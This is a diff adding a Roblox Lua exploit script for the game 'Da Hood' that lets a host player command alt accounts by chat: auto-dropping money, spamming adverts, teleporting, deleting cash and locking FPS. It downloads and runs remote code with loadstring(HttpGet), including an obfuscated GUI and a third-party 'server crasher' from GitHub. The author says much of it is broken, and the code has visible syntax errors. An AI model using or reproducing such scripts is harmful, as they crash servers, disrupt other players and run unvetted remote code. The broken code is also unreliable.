@@ -1,0 +1,172 @@
+--El altcontrol remake (synapse was down when i remade so half the features broken and prob dont work LMFAO)
+--[[Sorry for the shit remake it took me 30 minutes to make D:
+Skid everything if u would like i do not care at all 
+    No U#6734
+]]
+getgenv().admsg == 'message here ' -- put your message here
+getgenv().adcooldown = '16' -- put a cooldown in seconds here (Standard: 16)
+getgenv().fpskey = 'k' --hotkey to lock fps
+getgenv().fps = '1'
+getgenv().prefix = '.'
+getgenv().Host = 'Userhere' -- I added this because i dont feel like making a loadstring for every fucking user LOL
+getgenv().Alts = {
+Alt1 = 1 -- alt ids in here // 20 ALTS MAX!!
+Alt2 = 2
+Alt3 = 3 
+}
+
+local nou = game.Players[Host]
+local char = game.Players.LocalPlayer.Character
+local plr = game.Players.LocalPlayer
+_G.autodelete = false
+nou.Chatted:connect(function(msg)
+if msg == prefix.."drop toggle" then
+    local munkey = true
+    if munkey == true then
+        munkey = false
+    _G.autodrop = true
+    elseif munkey == false then
+        munkey = true
+        _G.autodrop = false
+    elseif msg == prefix.."ucdrop" then--Cant get cframes when synapse is down :D
+    elseif msg == prefix.."setup adminbase" then--Cant get cframes when synapse is down :D
+elseif msg == prefix.."setup club" then--Cant get cframes when synapse is down :D
+elseif msg == prefix.."setup basketball" then--Cant get cframes when synapse is down :D
+elseif msg == prefix.."bring" then --just gonna bring cuz setup stuff dont work rn
+    char.HumanoidRootPart.CFrame = nou.Character.HumanoidRootPart.CFrame    
+elseif msg == prefix.."fps 5" then
+    setfpscap(5)
+elseif msg == prefix.."fps 10" then
+    setfpscap(10)
+elseif msg == prefix.."fps 30" then
+    setfpscap(30)       
+elseif msg == prefix.."fps 5" then
+    setfpscap(5)
+elseif msg == Prefix.."wallet" then
+    local Wallet = true
+    if Wallet = true then
+        Wallet =  false
+    if game.Players.LocalPlayer.Backpack:FindFirstChild("Wallet") then
+    game.Players.LocalPlayer.Backpack:FindFirstChild("Wallet").Parent = game.Players.LocalPlayer.Character
+    end
+elseif Wallet == false then
+    Wallet = true
+    if game.Players.LocalPlayer.Character:FindFirstChild("Wallet") then
+    game.Players.LocalPlayer.Character:FindFirstChild("Wallet").Parent = game.Players.LocalPlayer.Backpack
+    end   
+end
+end
+elseif msg == prefix.."lava" then
+    local oh1 = CFrame.new(-455.11, 26.177, -282.678)
+    local oh2 = game:GetService("Players")
+    local oh3 = oh2.LocalPlayer.Character.HumanoidRootPart
+    oh3.CFrame = oh1
+elseif msg == prefix.."checkcash" then
+    if plr.Name == Alt1 then
+        local cah = Workspace.Ignored.Drop
+        local e = 0
+        for i, dick in pairs(cah:GetDescendants()) do
+        if dick.Name == "TextLabel" then
+        local sign = string.split(dick.Text, "$")[2]
+        local amt if string.match(sign,",") then 
+        amt =new:gsub("%,","") 
+        else
+        amt = sign + 0
+        end
+        sign = amt 
+        sign = tonumber(sign)
+        e = e + sign 
+        end 
+        end 
+        local function numform(num2) num2 = tostring(num2) return num2:reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "") 
+        end
+        local args = {
+            [1] = e
+            [2] = "All"
+                }
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))   
+                  
+    end    
+elseif msg == prefix.."test" then
+elseif msg == prefix.."advert start" then   
+    _G.advert = true 
+elseif msg == prefix.."advert stop" then   
+    _G.advert = false
+elseif msg == prefix.."lowgfx" then 
+    for ,v in pairs(workspace:GetDescendants()) do
+        if v.ClassName == "Part"
+        or v.ClassName == "SpawnLocation"
+        or v.ClassName == "WedgePart"
+        or v.ClassName == "Terrain"
+        or v.ClassName == "MeshPart" then
+        v.Material = "Plastic"
+        end
+        end
+        
+        for ,v in pairs(workspace:GetDescendants()) do
+        if v.ClassName == "Decal"
+        or v.ClassName == "Texture" then
+        v:Destroy()
+        end
+        end  
+    elseif msg == prefix.."loopdestroy start" then
+    _G.autodelete = true
+    for i,v in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
+        if v.Name == "MoneyDrop" then
+           v:Destroy() 
+            end
+        end
+    elseif msg == prefix.."loopdestroy stop" then
+_G.autodelete = false
+    elseif msg == prefix.."test" then
+        local args = {
+            [1] = "ElenaK",
+            [2] = "All"
+            }
+            print(args)
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+elseif msg == prefix.."swagcrash" then        
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()    --Was not made by me  
+end
+end)
+
+game.Workspace.Ignored.Drop.ChildAdded:Connect(function(elk)
+    if _G.autodelete == true then
+    wait(0.5)
+elk:Destroy()
+    end
+end)
+spawn(function()
+    while wait() do
+    if _G.autodrop == true then
+    game.ReplicatedStorage.MainEvent:FireServer('DropMoney','10000')
+    end
+    end
+    end)  
+spawn(function()
+    while wait(adcooldown) do
+    if _G.advert == true then
+    local args = {
+    [1] = admsg,
+    [2] = "All"
+    }
+    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+    end
+    end
+    end)  
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NoUGotbannedlol/Da-Hood-Remakes/main/el%20gui", true))() -- its moonsec v2 if u wanna decompile or deobf!
+-- goto [location/player] (bot) - [teleports bots to player or location, only teleports one bot if bot argument is passed]
+-- drop toggle - [toggles auto money drop]
+-- ucdrop (location/stop) - [drops money at location and reduces lag on bots, if stop argument is passed bots return to their last good location and stop dropping money]
+-- Current Locations: bank, adminbase, safezone, bank, current(only for UCDROP) -- RECOMMEND IS ;ucdrop current
+-- destroy - [Deletes Cash on Ground on Alts Screen]
+-- fps [5/10/30] - [Locks FPS to 5, 10 or 30]
+-- wallet - [Equips/Unequips Wallet on all Alt Accounts]
+-- roast - [Roast a Buyer with a cool message] @warlock#0003
+-- checkcash - [Alt1 types the Dropped Cash on Ground]
+-- test - [checks if script is working]
+-- advert [start/stop] - [Alt starts to send your advert message]
+-- lowgfx - [Removes Textures on every Alt Account]
+-- loopdestroy [start/stop] - [Enable/Disable Loopdestroying cash on ground]
+-- swagcrash - [Executes Swagcrasher]
+-- setup - [adminbase/club/basketball] - [Setups Alt on the Location]
